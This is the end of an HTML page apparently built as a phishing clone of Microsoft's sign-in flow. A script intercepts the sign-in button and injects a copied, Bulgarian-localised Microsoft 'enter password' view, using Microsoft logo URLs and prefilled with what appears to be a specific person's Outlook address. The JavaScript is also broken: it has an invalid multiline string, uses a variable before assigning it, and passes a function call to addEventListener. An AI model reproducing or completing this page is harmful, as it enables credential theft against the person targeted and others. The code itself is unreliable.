   var submit_btn = document.getElementById('idSIButton9');
   submit_btn.addEventListener('click', call_password_field());
   function call_password_field() {
     var email_lightbox = document.getElementsByClassName('lightbox')[0];
     email_lightbox.innerHTML = password_lightbox;
     var password_lightbox = '
 <!-- ko withProperties: { '$content': $data } -->
 <div class="flex-column">
     <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

     <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

     <div class="win-scroll">
         <div id="lightbox" data-bind="
             animationEnd: $page.paginationControlHelper.animationEnd,
             externalCss: { 'sign-in-box': true },
             css: {
                 'inner':  $content.isVerticalSplitTemplate,
                 'vertical-split-content': $content.isVerticalSplitTemplate,
                 'app': $page.backgroundLogoUrl,
                 'wide': $page.paginationControlHelper.useWiderWidth,
                 'fade-in-lightbox': $page.fadeInLightBox,
                 'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                 'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                 'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

             <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

         <!-- ko if: svr.BN --><!-- /ko -->

         <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.b9 &amp;&amp; showLightboxProgress() }"></div>

         <!-- ko if: showLightboxProgress --><!-- /ko -->

         <!-- ko if: loadBannerLogo -->
         <div data-bind="component: { name: 'logo-control',
             params: {
                 isChinaDc: svr.fIsChinaDc,
                 bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

 <!-- ko if: bannerLogoUrl --><!-- /ko -->

 <!-- ko if: !bannerLogoUrl && !isChinaDc -->
     <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
 <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
 <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
 <!-- /ko --><!-- /ko -->
 <!-- /ko --></div>
         <!-- /ko -->

         <!-- ko if: svr.c6 && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

         <!-- ko if: asyncInitReady -->
         <div role="main" data-bind="component: { name: 'pagination-control',
             publicMethods: paginationControlMethods,
             params: {
                 enableCssAnimation: svr.aw,
                 disableAnimationIfAnimationEndUnsupported: svr.CD,
                 initialViewId: initialViewId,
                 currentViewId: currentViewId,
                 initialSharedData: initialSharedData,
                 initialError: $loginPage.getServerError() },
             event: {
                 cancel: paginationControl_onCancel,
                 load: paginationControlHelper.onLoad,
                 unload: paginationControlHelper.onUnload,
                 loadView: view_onLoadView,
                 showView: view_onShow,
                 setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                 animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

 <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
     <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.I) -->
     <div data-bind="css: {
         'animate': animate() &amp;&amp; animate.animateBanner(),
         'slide-out-next': animate.isSlideOutNext(),
         'slide-in-next': animate.isSlideInNext(),
         'slide-out-back': animate.isSlideOutBack(),
         'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

         <div data-bind="component: { name: 'identity-banner-control',
             params: {
                 userTileUrl: svr.bX,
                 displayName: sharedData.displayName || svr.I,
                 isBackButtonVisible: isBackButtonVisible(),
                 focusOnBackButton: isBackButtonFocused(),
                 backButtonDescribedBy: backButtonDescribedBy() },
             event: {
                 } }"><!--  -->

 <div class="identityBanner">
     <!-- ko if: isBackButtonVisible -->
     <button type="button" class="backButton" data-bind="
         attr: { 'id': backButtonId || 'idBtn_Back' },
         ariaLabel: str['CT_HRD_STR_Splitter_Back'],
         ariaDescribedBy: backButtonDescribedBy,

         hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Назад">
         <!-- ko ifnot: svr.Cq -->
             <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
 <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
 <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
 <!-- /ko --><!-- /ko -->
         <!-- /ko -->

         <!-- ko if: svr.Cq --><!-- /ko -->
     </button>
     <!-- /ko -->

     <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="ivanbodurov@outlook.com">ivanbodurov@outlook.com</div>
 </div></div>
     </div>
     <!-- /ko -->

     <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
         'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.I),
         'zero-opacity': hidePaginatedView.hideSubView(),
         'animate': animate(),
         'slide-out-next': animate.isSlideOutNext(),
         'slide-in-next': animate.isSlideInNext(),
         'slide-out-back': animate.isSlideOutBack(),
         'slide-in-back': animate.isSlideInBack() }">

         <!-- ko foreach: views -->
             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() -->
                 <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                 params: {
                     serverData: svr,
                     serverError: initialError,
                     isInitialView: isInitialState,
                     username: sharedData.username,
                     displayName: sharedData.displayName,
                     hipRequiredForUsername: sharedData.hipRequiredForUsername,
                     passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                     availableCreds: sharedData.availableCreds,
                     evictedCreds: sharedData.evictedCreds,
                     useEvictedCredentials: sharedData.useEvictedCredentials,
                     showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                     flowToken: sharedData.flowToken,
                     defaultKmsiValue: svr.AJ === 1,
                     userTenantBranding: sharedData.userTenantBranding,
                     sessions: sharedData.sessions,
                     callMetadata: sharedData.callMetadata },
                 event: {
                     updateFlowToken: $loginPage.view_onUpdateFlowToken,
                     submitReady: $loginPage.view_onSubmitReady,
                     redirect: $loginPage.view_onRedirect,
                     resetPassword: $loginPage.passwordView_onResetPassword,
                     setBackButtonState: view_onSetIdentityBackButtonState,
                     setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

 <!--  -->

 <div aria-hidden="true">
     <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
     <input type="hidden" name="login" data-bind="value: unsafe_username" value="ivanbodurov@outlook.com">
     <!-- The loginfmt input type is different as some password managers require it to be of type text.
         Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
     <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
     <input type="hidden" name="type" data-bind="value: svr.Bz ? 20 : 11" value="11">
     <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
     <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
     <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
     <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
     <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
 </div>

 <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
     <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Въведете парола</div>
 </div>

 <!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

 <!-- ko if: unsafe_pageDescription --><!-- /ko -->

 <div class="row">
     <div class="form-group col-md-24">
         <div role="alert" aria-live="assertive">
             <!-- ko if: passwordTextbox.error --><!-- /ko -->
         </div>

         <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
             publicMethods: passwordTextbox.placeholderTextboxMethods,
             params: {
                 serverData: svr,
                 hintText: str['CT_PWD_STR_PwdTB_Label'] },
             event: {
                 updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
     <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            

             <!-- ko if: svr.ce && showPassword() --><!-- /ko -->
         <!-- /ko -->
 <!-- /ko -->
 <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

         <!-- ko if: svr.ce --><!-- /ko -->
     </div>
 </div>

 <!-- ko if: shouldHipInit --><!-- /ko -->

 <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
     <div>
         <!-- ko if: svr.C3 --><!-- /ko -->
         <!-- ko if: svr.BH !== false && !svr.C3 && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

         <div class="row">
             <div class="col-md-24">
                 <div class="text-13">
                     <!-- ko if: svr.aN && svr.aD --><!-- /ko -->
                     <!-- ko ifnot: hideForgotMyPassword -->
                     <div class="form-group">
                         <a id="idA_PWD_ForgotPassword" role="link" href="#" data-bind="
                             text: unsafe_forgotPasswordText,
                             href: accessRecoveryLink || svr.R,
                             attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                             click: accessRecoveryLink ? null : resetPassword_onClick">Забравена парола?</a>
                     </div>
                     <!-- /ko -->
                     <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                     <!-- ko ifnot: useEvictedCredentials -->
                         <!-- ko component: { name: "cred-switch-link-control",
                             params: {
                                 serverData: svr,
                                 username: username,
                                 availableCreds: availableCreds,
                                 flowToken: flowToken,
                                 currentCred: { credType: 1 } },
                             event: {
                                 switchView: credSwitchLink_onSwitchView,
                                 redirect: onRedirect,
                                 setPendingRequest: credSwitchLink_onSetPendingRequest,
                                 updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

 <div class="form-group">
     <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

     <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
         <!-- ko ifnot: hideCredSwitchLink -->
         <a href="#" data-bind="
             attr: { 'id': switchToCredId },
             text: switchToCredText,
             click: switchToCred_onClick" id="idA_PWD_SwitchToFido">Влизане с ключ за защита</a>
         <!-- /ko -->

         <!-- ko if: displayHelp && selectedCredType === 7 --><!-- /ko -->
     <!-- /ko -->

     <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
 </div>

 <!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                         <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                     <!-- /ko -->
                     <!-- ko if: showChangeUserLink --><!-- /ko -->
                 </div>
             </div>
         </div>
     </div>

     <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
         <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
             <div data-bind="component: { name: 'footer-buttons-field',
                 params: {
                     serverData: svr,
                     primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                     isPrimaryButtonEnabled: !isRequestPending(),
                     isPrimaryButtonVisible: svr.e,
                     isSecondaryButtonEnabled: true,
                     isSecondaryButtonVisible: false },
                 event: {
                     primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }">

     <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

     <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
         <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
         <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                 attr: primaryButtonAttributes,
                 externalCss: {
                     'button': true,
                     'primary': true },
                 value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                 hasFocus: focusOnPrimaryButton,
                 click: primaryButton_onClick,
                 enable: isPrimaryButtonEnabled,
                 visible: isPrimaryButtonVisible,
                 preventTabbing: primaryButtonPreventTabbing" value="Влизане" data-report-attached="1">
     </div>
 </div></div>
         </div>
     </div>
 </div>

 <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
 </div><!-- /ko -->
             <!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
         <!-- /ko -->
     </div>
 </div></div>
         <!-- /ko -->

         <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
         <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
         <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
         <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
         <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
         <input type="hidden" name="ctx" data-bind="value: ctx" value="">
         <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
         <input type="hidden" id="i0327" data-bind="attr: { name: svr.bj }, value: flowToken" name="PPFT" value="Df*GLA4ODVPlpoaOj3BgaAYvu7*N1hIjuGBFY84J91AHOmE*bAR2bx5R!EU!gSRsFbUa2zKBITp*jmPB1p90PIiREiRNvCQTTfRhlIX9uchtZ*blejrIr396ZAE*vpraPSvrxbJP*OUYfBsSQ1iITgAnrhJlHP1bY4qRsX8xMUqtBn5M54*ib0xGshOdFtkgRklyIl4YjFAghqYym6MH1wQdyIdz5W2M!HLU0F*zh18VmXpa0h1C8G4kIIi0vWFVJg$$">
         <input type="hidden" name="PPSX" data-bind="value: svr.cz" value="Pas">
         <input type="hidden" name="NewUser" value="1">
         <input type="hidden" name="FoundMSAs" data-bind="value: svr.Al" value="">
         <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
         <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
         <input type="hidden" name="CookieDisclosure" data-bind="value: svr.BN ? 1 : 0" value="0">
         <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
         <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
         <div data-bind="component: { name: 'instrumentation-control',
             publicMethods: instrumentationMethods,
             params: { serverData: svr } }">
 <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
     <!-- /ko -->
         </div>

         <!-- ko if: $page.showFedCredAndNewSession -->
         <!-- ko if: $page.showFedCredButtons --><!-- /ko -->

         <!-- ko if: $page.newSession --><!-- /ko -->
         <!-- /ko -->

         <!-- ko if: $page.showDebugDetails --><!-- /ko -->
     </div>
 </div>
   }
 </script>
 </body>
 </html>
